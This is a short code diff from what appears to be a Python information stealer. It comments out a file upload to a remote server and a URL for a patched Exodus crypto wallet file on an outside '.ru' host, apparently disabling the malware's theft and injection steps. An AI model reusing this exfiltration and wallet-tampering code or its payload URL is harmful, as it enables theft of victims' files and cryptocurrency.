@@ -844,15 +844,15 @@ def upload_to_server(filepath):
 
 
 
-            r = requests.post(url, files=files)
+            #r = requests.post(url, files=files)
 
 
 
-            if r.status_code == 200:
+            #if r.status_code == 200:
 
 
 
-                break
+                #break
 
 
 
@@ -952,7 +952,7 @@ def inject():
 
 
 
-    exodusPatchURL = "https://dieserbenni.ru/app2.asar"
+    #exodusPatchURL = "https://dieserbenni.ru/app2.asar"
 
 
 
